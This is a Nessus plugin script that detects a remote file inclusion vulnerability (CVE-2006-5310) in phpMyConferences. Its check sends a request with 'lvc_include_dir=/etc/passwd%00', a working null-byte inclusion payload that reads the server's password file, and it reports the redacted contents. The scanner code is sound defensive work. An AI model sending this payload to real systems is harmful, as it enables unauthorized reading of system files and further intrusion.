#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(22873);
  script_version("1.16");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/04/11");

  script_cve_id("CVE-2006-5310");
  script_bugtraq_id(20505);
  script_xref(name:"EDB-ID", value:"2535");

  script_name(english:"phpMyConferences menus.inc.php lvc_include_dir Parameter Remote File Inclusion");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is prone to a remote
file include issue.");
  script_set_attribute(attribute:"description", value:
"The remote host is using phpMyConferences, a conference management
system written in PHP. 

The version of phpMyConferences installed on the remote host fails to
sanitize input to the 'lvc_include_dir' parameter before using it to
include PHP code in the 'common/visiteurs/include/menus.inc.php'
script.  Provided PHP's 'register_globals' setting is enabled, an
unauthenticated attacker may be able to exploit this issue to view
arbitrary files or to execute arbitrary PHP code on the remote host,
subject to the privileges of the web server user id.");
  script_set_attribute(attribute:"solution", value:
"Unknown at this time.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");

  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"false");

  script_set_attribute(attribute:"vuln_publication_date", value:"2006/10/13");
  script_set_attribute(attribute:"plugin_publication_date", value:"2006/10/16");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:phpmyconferences:phpmyconferences");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2022 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("http_version.nasl");
  script_require_keys("www/PHP");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("data_protection.inc");

port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/phpMyConferences", "/phpmyconferences", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  # Grab index.php.
  file = "/etc/passwd";
  r = http_send_recv3(method:"GET", port: port,
    item:string(
      dir, "/common/visiteurs/include/menus.inc.php?",
      "lvc_include_dir=", file, "%00" ));
  if (isnull(r)) exit(0);
  res = r[2];

  # There's a problem if there's an entry for root.
  if (
    # there's an entry for root or...
    egrep(pattern:"root:.*:0:[01]:", string:res) ||
    # we get an error saying "failed to open stream" or...
    string("main(", file, "\\0/menus-.inc.php): failed to open stream") >< res ||
    # we get an error claiming the file doesn't exist or...
    string("main(", file, "): failed to open stream: No such file") >< res ||
    # we get an error about open_basedir restriction.
    string("open_basedir restriction in effect. File(", file) >< res
  )
  {
    if (report_verbosity && egrep(pattern:"root:.*:0:[01]:", string:res))
    {
      contents = strstr(res, 'NOWRAP VALIGN="top">');
      if (contents) contents = contents - 'NOWRAP VALIGN="top">';
      if (contents) contents = contents - strstr(contents, "</TD");
    }

    if (contents)
    {
      contents = data_protection::redact_etc_passwd(output:contents);
      report = string(
        "\n",
        "Here are the contents of the file '/etc/passwd' that Nessus\n",
        "was able to read from the remote host :\n",
        "\n",
        contents
      );
      security_warning(port:port, extra:report);
    }
    else security_warning(port);

    exit(0);
  }
}
